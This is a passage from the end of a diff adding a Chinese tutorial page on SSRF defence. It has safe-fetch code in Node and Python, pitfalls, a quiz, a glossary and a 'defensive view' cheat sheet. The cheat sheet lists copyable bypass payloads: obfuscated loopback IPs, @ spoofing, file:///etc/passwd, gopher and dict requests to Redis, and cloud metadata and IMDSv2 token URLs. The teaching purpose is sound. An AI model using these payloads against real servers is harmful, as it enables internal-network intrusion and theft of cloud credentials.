+    servername: u.hostname,               <span class="c">// TLS SNI 仍用原域名，证书才能过</span>
+  });
+  <span class="c">// 5) 超时保护；调用方负责 end()；不自动跟随重定向（本实现不处理 3xx）</span>
+  req.setTimeout(3000, () =&gt; req.destroy(new Error("timeout")));
+  return req;
+}
+
+app.get("/fetch", async (req, res) =&gt; {
+  try {
+    const upstream = await safeFetch(req.query.url);
+    const r = await new Promise((resolve, reject) =&gt; {
+      let body = "";
+      upstream.on("response", (resp) =&gt; {
+        resp.setEncoding("utf8");
+        resp.on("data", (c) =&gt; {
+          body += c;
+          if (body.length &gt; 1e6) { upstream.destroy(); reject(new Error("too large")); }
+        });
+        resp.on("end", () =&gt; resolve({ status: resp.statusCode, body }));
+      });
+      upstream.on("error", reject);
+      upstream.end();
+    });
+    res.json(r);
+  } catch (e) {
+    res.status(400).json({ error: "blocked" });   <span class="c">// 不把内部细节返回给用户</span>
+  }
+});</pre>
+  <h3>安全版（Python：同样思路，更短）</h3>
+  <pre><span class="c">import ipaddress, socket</span>
+from urllib.parse import urlparse
+import requests
+
+ALLOWED = {"api.trusted.com", "cdn.trusted.com"}
+
+def safe_get(url):
+    p = urlparse(url)
+    if p.scheme not in ("http", "https"):
+        raise ValueError("scheme blocked")
+    if p.hostname not in ALLOWED:
+        raise ValueError("host blocked")
+    port = p.port or (443 if p.scheme == "https" else 80)
+    if port not in (80, 443):
+        raise ValueError("port blocked")
+
+    <span class="c"># 解析后校验：每个地址都必须是全球单播</span>
+    infos = socket.getaddrinfo(p.hostname, port, proto=socket.IPPROTO_TCP)
+    for info in infos:
+        ip = ipaddress.ip_address(info[4][0])
+        if not (ip.is_global and not ip.is_private and not ip.is_link_local):
+            raise ValueError("ip blocked: %s" % ip)
+
+    <span class="c"># pin IP：用 IP 直连，Host 头带原域名；不跟随重定向</span>
+    ip = infos[0][4][0]
+    real = f"{p.scheme}://{ip}{p.path or '/'}"
+    if p.query:
+        real += "?" + p.query
+    return requests.get(real, headers={"Host": p.hostname},
+                        allow_redirects=False, timeout=(3, 5), stream=True)</pre>
+  <div class="callout warn">
+    <b>Java 的坑：</b><span class="k">new URL(userInput).openConnection()</span> 是老 SSRF 制造机。JDK 的 <span class="k">URL</span> 解析与浏览器不一致（@、空白字符、畸形端口）。要用 <span class="k">URI.create()</span> 严格解析，校验后手动构造 <span class="k">HttpRequest.newBuilder(uri)</span>，并配 <span class="k">HttpClient.newBuilder().followRedirects(NEVER)</span>。OkHttp 同理：<span class="k">followRedirects(false)</span>、<span class="k">dns()</span> 换成校验过的自定义 Dns 实现。
+  </div>
+</section>
+
+<section id="s7">
+  <div class="shead"><span class="mins">模块 7</span><h2>与代理、网关的关系</h2></div>
+  <p class="lead">大量 SSRF 不发生在业务代码里，而发生在<b>代理层</b>：正向代理、API 网关、服务网格 sidecar、headless 浏览器 —— 它们天生就是"替人发请求"的角色。</p>
+  <table>
+    <tr><th style="width:150px">组件</th><th>典型 SSRF 形态</th><th>要点</th></tr>
+    <tr><td><b>Nginx 反代</b></td><td class="f">proxy_pass http://$host; 变量拼接</td><td>Host 头可控时 $host 可被伪造成内网地址；变量触发运行时解析，需配 <span class="k">resolver</span> 且校验</td></tr>
+    <tr><td><b>Nginx CRLF</b></td><td class="f">proxy_pass $uri; 含 %0d%0a</td><td>未解码的 URI 变量带 CRLF 会注入请求头/走私请求行</td></tr>
+    <tr><td><b>API 网关</b></td><td>上游地址来自租户配置</td><td>多租户网关允许自定义 upstream 时，必须服务端校验目标（云网关靠 VPC link 绑定缓解）</td></tr>
+    <tr><td><b>服务网格</b></td><td>sidecar 出站</td><td>Envoy/Istio 的 egress 白名单（ServiceEntry）就是零信任里的"出站策略"，别开着全通</td></tr>
+    <tr><td><b>渲染服务</b></td><td>headless Chrome 打开用户 URL</td><td>能读 file://、探内网、执行 JS。必须：禁 file 协议、独立网络命名空间、短生命周期沙箱</td></tr>
+    <tr><td><b>Webhook 中继</b></td><td>替租户转发回调</td><td>对所有回调目标做与上述同样的校验；响应不要回传给提交者</td></tr>
+  </table>
+  <pre><span class="c"># nginx 变量型 proxy_pass 的风险示例（不要照抄到生产）</span>
+location ~ ^/proxy/(.*)$ {
+  resolver 127.0.0.11 valid=10s;
+  proxy_pass http://$1;          <span class="c"># $1 是用户路径的一部分 → 用户决定上游</span>
+}
+<span class="c"># 防御：上游只允许来自服务端配置的白名单，不允许请求路径决定 upstream</span></pre>
+  <div class="callout">
+    <b>一个判断准则：</b>任何"输入是 URL、输出是远程内容"的组件，都是 SSRF 面。评估时要问三个问题：<b>协议能控吗？目标能控吗？每一跳都校验吗？</b>三个里缺任何一个，就按有 SSRF 处理。
+  </div>
+</section>
+
+<section id="s8">
+  <div class="shead"><span class="mins">模块 8</span><h2>十个真实坑</h2></div>
+  <div class="pit"><div class="num">1</div><div class="pb"><div class="pt">用字符串包含判断"是不是内网"</div><div class="pd">url.includes("127.0.0.1") 防不住 2130706433、0x7f000001、017700000001、127.1。IP 判断必须用网络库解析成规范形式再比范围。</div></div></div>
+  <div class="pit"><div class="num">2</div><div class="pb"><div class="pt">只校验域名，不在解析后校验 IP</div><div class="pd">域名白名单是对的，但攻击者注册一个自己的域名解析到 127.0.0.1 就直接过。正确顺序：先过域名白名单，再解析，再校验每个 IP 是公网地址。</div></div></div>
+  <div class="pit"><div class="num">3</div><div class="pb"><div class="pt">校验一次就信，连接时再次解析</div><div class="pd">DNS rebinding（TTL=0）专打这个 gap。校验后要把 IP pin 住再建连，或者把校验放进自定义 Dns/HTTP 适配器。</div></div></div>
+  <div class="pit"><div class="num">4</div><div class="pb"><div class="pt">允许自动跟随 302 且每跳不校验</div><div class="pd">白名单看的是 evil.com/redir，实际打的是 169.254.169.254。要么 followRedirects(NEVER)，要么对每一跳重新完整校验。</div></div></div>
+  <div class="pit"><div class="num">5</div><div class="pb"><div class="pt">用黑名单封内网段，漏一堆保留段</div><div class="pd">常见漏网：0.0.0.0（Linux 路由到本机）、127.1、::1、::ffff:127.0.0.1、100.64.0.0/10（CGNAT）、169.254.0.0/16（链路本地）、192.0.0.0/24、198.18.0.0/15。反过来用"只允许公网单播"的白名单思路。</div></div></div>
+  <div class="pit"><div class="num">6</div><div class="pb"><div class="pt">不限制协议，gopher/file/dict 全放开</div><div class="pd">Python requests 不默认支持 gopher，但 urllib/curl/部分封装支持；file:// 直接读本地文件。协议白名单只留 http/https。</div></div></div>
+  <div class="pit"><div class="num">7</div><div class="pb"><div class="pt">云上不开 IMDSv2，容器裸奔访问元数据</div><div class="pd">一次 SSRF 直接拿走实例角色临时凭证，等同于云账号部分权限泄露。IMDSv2（或阿里云加固模式）+ egress 限制，两件事半小时能做完。</div></div></div>
+  <div class="pit"><div class="num">8</div><div class="pb"><div class="pt">把远程响应原文返回给前端</div><div class="pd">盲 SSRF 变回显 SSRF，内网扫描效率翻倍；同时还引入存储型 XSS（把远程 HTML 塞进自己页面）。响应要么不回显，要么按不可信内容消毒。</div></div></div>
+  <div class="pit"><div class="num">9</div><div class="pb"><div class="pt">白名单用后缀匹配</div><div class="pd">endswith("trusted.com") 会放行 api.trusted.com.evil.com 和 nottrusted.com。要整体相等匹配，或至少匹配 ".trusted.com" 后缀且再取一层。</div></div></div>
+  <div class="pit"><div class="num">10</div><div class="pb"><div class="pt">无超时、无响应大小限制、无出站日志</div><div class="pd">内网未开放端口让连接挂起，线程池被慢请求占满 = DoS；出站无日志，事后无法溯源是哪次请求打到了元数据。超时 3~5 秒 + 响应 1MB 截断 + 全量出站日志。</div></div></div>
+</section>
+
+<section id="s9">
+  <div class="shead"><span class="mins">自测</span><h2>六道题</h2></div>
+  <div class="quiz">
+    <div class="q" data-a="1">
+      <div class="qt">1. SSRF 真正的危害来自哪里？</div>
+      <button class="opt">攻击者可以直接访问内网</button>
+      <button class="opt">服务端位于内网、拥有云身份、并被内网组件信任</button>
+      <button class="opt">HTTP 协议本身有缺陷</button>
+      <div class="ans">正确答案：<b>服务端的位置和身份</b>。攻击者自己摸不到内网，是服务端替他"伸手"，而且这只手还带着 IAM 临时凭证、内网信任关系。所以修复方向是收缩服务端的可达面，而不是修 HTTP。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">2. 云服务器上最常见的元数据服务地址是？</div>
+      <button class="opt">8.8.8.8</button>
+      <button class="opt">192.168.1.1</button>
+      <button class="opt">169.254.169.254（阿里云为 100.100.100.100）</button>
+      <div class="ans">正确答案：<b>169.254.169.254</b>。它是链路本地地址（169.254.0.0/16），对同 VPC 机器天然可达，所以必须靠 IMDSv2 或网络层策略拦截，不能指望"外网访问不到"。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">3. gopher 协议在 SSRF 里为什么特别危险？</div>
+      <button class="opt">它可以把任意 TCP 字节流发给任意端口，等于手工操作 Redis/MySQL 等内网服务</button>
+      <button class="opt">它比 HTTP 更快</button>
+      <button class="opt">它可以绕过 HTTPS 加密</button>
+      <div class="ans">正确答案：<b>构造任意 TCP 字节流</b>。gopher://host:port/_后面就是原始 payload，攻击者可以完整控制协议内容，把 SSRF 从"读网页"升级为"打内网服务"。防御必须协议白名单只留 http/https。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">4. DNS rebinding 利用的是哪种不一致？</div>
+      <button class="opt">浏览器同源策略缺陷</button>
+      <button class="opt">HTTPS 证书校验缺失</button>
+      <button class="opt">域名校验时的解析结果与实际连接时的解析结果不同（TTL=0 让两次解析返回不同 IP）</button>
+      <div class="ans">正确答案：<b>校验与连接的解析结果不一致</b>。第一次解析返回公网 IP 过白名单，第二次解析返回 127.0.0.1 打进内网。防御是解析后校验 + pin IP 建连。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">5. 防御 DNS rebinding 的正确做法是？</div>
+      <button class="opt">封禁所有外部 DNS</button>
+      <button class="opt">解析后校验每个 IP 为公网单播地址，并用该校验过的 IP 建立连接</button>
+      <button class="opt">给域名加长 TTL</button>
+      <div class="ans">正确答案：<b>解析后校验 + pin IP</b>。长 TTL 反而帮攻击者缓存内网结果；禁 DNS 不现实。关键是消灭"校验看到的"和"连接用到的"之间的 gap。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">6. AWS IMDSv2 相比 v1 的关键改进是？</div>
+      <button class="opt">读取元数据前必须先 PUT 获取 token 并随请求携带，纯 GET 型 SSRF 失效</button>
+      <button class="opt">元数据地址变了</button>
+      <button class="opt">响应内容加密了</button>
+      <div class="ans">正确答案：<b>强制 token（PUT /latest/api/token）</b>。SSRF 漏洞通常只能发出 GET 请求，无法先 PUT 拿 token，v2 直接把这类利用废掉。阿里云等厂商有等价加固机制，务必开启。</div>
+    </div>
+  </div>
+</section>
+
+<section id="s10">
+  <div class="shead"><span class="mins">附录</span><h2>速查卡与术语表</h2></div>
+  <h3>绕过与检测速查（防御视角）</h3>
+  <div class="cmds">
+    <div class="crow"><code>http://2130706433/</code><span class="desc">127.0.0.1 的十进制写法，打字符串型 IP 黑名单</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://0x7f.0.0.1/</code><span class="desc">十六进制 IP 段，Linux inet_aton 接受</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://127.1/</code><span class="desc">省略补零简写，绕过"必须四段"的正则</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://[::1]/</code><span class="desc">IPv6 环回，打只处理 IPv4 的逻辑</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://0.0.0.0/</code><span class="desc">Linux 上 0.0.0.0 路由到本机</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://api.trusted.com@127.0.0.1/</code><span class="desc">@ 欺骗：真实 host 是 127.0.0.1</span><button class="copy">复制</button></div>
+    <div class="crow"><code>file:///etc/passwd</code><span class="desc">协议走私：读服务端本地文件</span><button class="copy">复制</button></div>
+    <div class="crow"><code>dict://127.0.0.1:6379/info</code><span class="desc">协议走私：读服务 banner，探端口服务</span><button class="copy">复制</button></div>
+    <div class="crow"><code>gopher://127.0.0.1:6379/_PAYLOAD</code><span class="desc">协议走私：任意 TCP 字节流（_ 后为 payload，%0d%0a 为 CRLF）</span><button class="copy">复制</button></div>
+    <div class="crow"><code>http://169.254.169.254/latest/meta-data/</code><span class="desc">云元数据入口（阿里云 100.100.100.100）</span><button class="copy">复制</button></div>
+    <div class="crow"><code>curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token</code><span class="desc">IMDSv2 取 token 的姿势</span><button class="copy">复制</button></div>
+  </div>
+
+  <h3>防御 checklist</h3>
+  <pre><span class="c"># SSRF 上线前自查（10 条全过才放行）</span>
+[ ] 协议白名单：只允许 http/https，显式禁 gopher/file/dict/ftp
+[ ] 目标白名单：精确相等匹配，不用后缀/包含匹配
+[ ] 端口限制：只允许 80/443，禁止用户指定端口
+[ ] 解析后校验：DNS 解析结果逐个判断为公网单播地址
+[ ] pin IP：用校验过的 IP 建连，Host 头带原域名
+[ ] 重定向：不自动跟随，或每一跳重新完整校验
+[ ] 超时 3~5s + 响应体 1MB 截断
+[ ] 云上开启 IMDSv2 / 元数据加固模式；容器禁访 169.254.169.254
+[ ] 出站走统一 egress 代理，白名单 + 全量日志
+[ ] 远程响应不回显给前端、不内联进自己页面</pre>
+
+  <h3>术语表</h3>
+  <table>
+    <tr><th style="width:190px">术语</th><th>一句话解释</th></tr>
+    <tr><td><b>SSRF</b></td><td>服务端请求伪造：攻击者控制服务端请求的目标地址</td></tr>
+    <tr><td><b>回显 SSRF</b></td><td>响应内容返回给攻击者，可直接读取内网页面</td></tr>
+    <tr><td><b>盲 SSRF</b></td><td>看不到响应，靠 DNS 外带、时间差、间接回显验证</td></tr>
+    <tr><td><b>DNS rebinding</b></td><td>TTL=0 让校验与连接两次解析返回不同 IP，绕过域名白名单</td></tr>
+    <tr><td><b>元数据服务 IMDS</b></td><td>云实例本地提供自身信息和临时凭证的 HTTP 服务</td></tr>
+    <tr><td><b>IMDSv2</b></td><td>强制先 PUT 取 token 再读元数据，废掉纯 GET 型 SSRF 利用</td></tr>
+    <tr><td><b>链路本地地址</b></td><td>169.254.0.0/16，只在链路内有效，元数据服务用的就是它</td></tr>
+    <tr><td><b>gopher 协议</b></td><td>可携带任意 TCP 字节流的协议，SSRF 协议走私核心</td></tr>
+    <tr><td><b>dict 协议</b></td><td>字典服务协议，常被用来读端口 banner</td></tr>
+    <tr><td><b>file 协议</b></td><td>读本地文件，file:///etc/passwd 即路径穿越读文件</td></tr>
+    <tr><td><b>IP 变形</b></td><td>十进制/八进制/十六进制/简写 IPv4，绕过字符串型 IP 过滤</td></tr>
+    <tr><td><b>@ 欺骗</b></td><td>利用 URL 中 userinfo@host 结构，让校验方看错真实主机</td></tr>
+    <tr><td><b>IPv4-mapped IPv6</b></td><td>::ffff:a.b.c.d 形式，只识别 IPv4 或只识别 ::1 的规则会漏</td></tr>
+    <tr><td><b>pin IP</b></td><td>把校验过的 IP 固定用于建连，消除二次解析风险</td></tr>
+    <tr><td><b>出站代理 egress</b></td><td>统一管控出网流量的代理，白名单 + 日志都在这上面做</td></tr>
+    <tr><td><b>时间侧信道</b></td><td>通过端口开放/关闭的响应时间差异探测内网服务</td></tr>
+    <tr><td><b>OOB 外带</b></td><td>Out-of-Band，用 DNS/HTTP 请求到攻击者服务器来验证漏洞</td></tr>
+    <tr><td><b>CGNAT 段</b></td><td>100.64.0.0/10，运营商级 NAT 地址，同样要拦</td></tr>
+    <tr><td><b>Capital One 事件</b></td><td>2019 年 SSRF → 元数据凭证 → S3 数据泄露的标志性案例</td></tr>
+  </table>
+
+  <div class="callout ok">
+    <b>下一步怎么练：</b>用自己的靶场完成这四件事 —— ① 用 <span class="k">curl -w "%{time_total}"</span> 对 10 个端口做时间差扫描，画出"内网端口图"；② 用 <span class="k">2130706433</span> 和 <span class="k">0x7f.0.0.1</span> 打自己写的字符串过滤，确认变形生效；③ 给自己服务加上 <span class="k">dns.resolve</span> + <span class="k">assertPublic</span> + pin IP 三层，然后重新尝试所有绕过手法，确认全部失效；④ 在 AWS 控制台把一个测试实例切到 <span class="k">http-tokens required</span>，对比 v1/v2 的请求差异。<br><br>
+    <b>之后值得单独学：</b>XXE 与 SSRF 的组合（XML 里塞 URL 让服务端去抓）、headless 浏览器渲染型 SSRF 的沙箱方案、以及零信任架构下的出站策略设计（见网络与零信任篇）。
+  </div>
+</section>
+
+</main>
+
+<footer>二十分钟学透 SSRF 深入与防御 · 上线前务必检查：白名单、解析后校验、IMDSv2</footer>
+
+<script>
+var total=1200,left=total,timer=null,running=false;
+var clock=document.getElementById('clock'),startBtn=document.getElementById('start'),hint=document.getElementById('hint');
+function fmt(s){var m=Math.floor(s/60),x=s%60;return (m<10?'0':'')+m+':'+(x<10?'0':'')+x;}
+function tick(){
+  left--;clock.textContent=fmt(Math.max(left,0));
+  if(left<=180&&left>0){clock.classList.add('done');}
+  if(left<=0){
+    clearInterval(timer);running=false;clock.textContent='00:00';clock.classList.add('done');
+    startBtn.textContent='再来一轮';
+    hint.textContent='时间到。模块 3（绕过手法）和模块 5（防御）是重点，值得再读一遍。';
+  }
+}
+startBtn.onclick=function(){
+  if(running){clearInterval(timer);running=false;startBtn.textContent='继续';return;}
+  if(left<=0){left=total;clock.classList.remove('done');clock.textContent=fmt(left);}
+  running=true;startBtn.textContent='暂停';
+  hint.textContent='计时中 —— 边看边在靶场里敲。';
+  timer=setInterval(tick,1000);
+};
+document.getElementById('reset').onclick=function(){
+  clearInterval(timer);running=false;left=total;
+  clock.textContent=fmt(total);clock.classList.remove('done');
+  startBtn.textContent='开始计时';
+  hint.textContent='建议起一个 httpbin 跟着敲：docker run -d -p 8080:80 kennethreitz/httpbin';
+};
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  document.getElementById('bar').style.width=(h>0?(window.scrollY/h*100):0)+'%';
+});
+document.querySelectorAll('.copy').forEach(function(b){
+  b.onclick=function(){
+    var t=b.parentNode.querySelector('code').textContent;
+    var done=function(){b.textContent='已复制';b.classList.add('ok');setTimeout(function(){b.textContent='复制';b.classList.remove('ok');},1200);};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,function(){fb(t);done();});}
+    else{fb(t);done();}
+  };
+});
+function fb(t){
+  var ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+document.querySelectorAll('.q').forEach(function(q){
+  var idx=parseInt(q.dataset.a,10),opts=q.querySelectorAll('.opt');
+  opts.forEach(function(o,i){
+    o.onclick=function(){
+      if(q.dataset.done)return;
+      q.dataset.done='1';
+      opts.forEach(function(x,j){x.classList.add(j===idx?'right':'wrong');});
+      q.querySelector('.ans').classList.add('show');
+    };
+  });
+});
+</script>
+</body>
+</html>
